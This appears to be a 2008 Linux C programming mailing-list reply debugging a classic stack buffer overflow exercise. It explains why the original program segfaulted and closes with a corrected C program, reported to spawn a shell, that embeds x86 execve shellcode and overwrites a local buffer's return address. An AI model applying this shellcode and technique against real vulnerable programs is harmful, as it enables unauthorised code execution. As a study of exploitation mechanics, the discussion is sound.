From: nai.xia@gmail.com
Subject: Re: buffer overflow
Date: Mon, 17 Mar 2008 16:28:52 +0800
Message-ID: <20080317082852.GB13731@knoppix>
Mime-Version: 1.0
Return-path: <linux-c-programming-owner@vger.kernel.org>
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=gamma;
        h=domainkey-signature:received:received:date:from:to:subject:message-id:mime-version:content-type:content-disposition:user-agent;
        bh=jFgoC0eK22zqRcZyhQO8qv6WVkztC4mX8SIGu1cQkGE=;
        b=iIouqHf9KEET9ln/mUvsrkultKM+Tx99oQ11/B/hM+/imGhb/lfjvXdQk8AlUA0HJViMwFG79VF4j6RJT+P4/cXwPcYJVLbbsA/LDWbC1YQXVAldGZL21tMhcmdYjADY4oOO8Ax2tk3sffGz6NeYxTixAZiZCm7+YIx46ZIfASk=
Content-Disposition: inline
Sender: linux-c-programming-owner@vger.kernel.org
List-ID: <linux-c-programming.vger.kernel.org>
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: 7bit
To: linux-c-programming@vger.kernel.org

----- Forwarded message from nai.xia@gmail.com -----

Date: Mon, 17 Mar 2008 16:19:40 +0800
From: nai.xia@gmail.com
Subject: Re: buffer overflow
To: Varun Chandramohan <varunc@linux.vnet.ibm.com>

I think there are three errors in your testing program. 


On Tue, Mar 11, 2008 at 11:38:38AM +0530, Varun Chandramohan wrote:
> Hi all,
> 
>              Can someone tell me whats is wrong with this program? All i
> get is seg fault. Iam trying to create a stack overflow and exec a
> shell. Somehow its not working. The system is x86 on linux.
> gcc (GCC) 4.1.1 20070105 (Red Hat 4.1.1-52)
> Copyright (C) 2006 Free Software Foundation, Inc.
> This is free software; see the source for copying conditions.  There is NO
> warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
> 
> 
> 
> The Code:
> #include <stdio.h>
> #include <string.h>
> 
> char shellcode[] =
>         "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
>         "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
>         "\x80\xe8\xdc\xff\xff\xff/bin/sh";

I disassembled the shellcode and I don't think it is valid.

> #if 0
> char shellcode[] =
>         "\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00"
>         "\x00\xb8\x0b\x00\x00\x00\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80"
>         "\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xd1\xff\xff"
>         "\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x89\xec\x5d\xc3";
> 
> #endif
> 
> char large_string[128];

the string is not _large_ enough. in my Linux box, it takes about 132 bytes
from buffer to return address,which means, you just filled part of the stack with
junk bytes after large_string+127 instead of &buffer

> int main() {
>   char buffer[96];
>   int i;
>   long *long_ptr = (long *) large_string;
>   memset(&buffer,0,sizeof(buffer));
> 
>   for (i = 0; i < 32; i++)
>     *(long_ptr + i) =  (long)&buffer;
> 
>   for (i = 0; i < strlen(shellcode); i++)
>     large_string[i] = shellcode[i];
> 
>   strcpy(buffer,large_string);
> }

the return behavior of "main" is somewhat different from any other plain
functons. And below is taken from my program. 


 804846f:	e8 cc fe ff ff       	call   8048340 <strcpy@plt>
 8048474:	83 ec 80             	sub    $0xffffff80,%esp
 8048477:	59                   	pop    %ecx
 8048478:	5b                   	pop    %ebx
 8048479:	5d                   	pop    %ebp
 804847a:	8d 61 fc             	lea    -0x4(%ecx),%esp
 804847d:	c3                   	ret    

We can see that it's not direct "pop" of the stack, 
the stack is adjusted with "lea" just before the "ret",
so your shellcode address is not filled into the "eip" but to "esp"! 

And at last, here is my modified version (sucessfully got a shell in my box)
of your test program:



#include <stdio.h>
#include <string.h>

char shellcode[] =
"\x31\xc0\x31\xdb\xb0\x06\xcd\x80"
"\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80"
"\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";
#if 0
char shellcode[] =
        "\xeb\x2a\x5e\x89\x76\x08\xc6\x46\x07\x00\xc7\x46\x0c\x00\x00\x00"
        "\x00\xb8\x0b\x00\x00\x00\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80"
        "\xb8\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xd1\xff\xff"
        "\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\x89\xec\x5d\xc3";

#endif

char large_string[256];
int foo() {
  char buffer[96];
  int i;
  long *long_ptr = (long *) large_string;
  memset(&buffer,0,sizeof(buffer));

  for (i = 0; i < 256/4; i++)
    *(long_ptr + i) =  (long)&buffer;

  for (i = 0; i < strlen(shellcode); i++)
    large_string[i] = shellcode[i];

  strcpy(buffer,large_string);
}

int main()
{
	foo();
}




> 
> --
> To unsubscribe from this list: send the line "unsubscribe linux-c-programming" in
> the body of a message to majordomo@vger.kernel.org
> More majordomo info at  http://vger.kernel.org/majordomo-info.html

----- End forwarded message -----
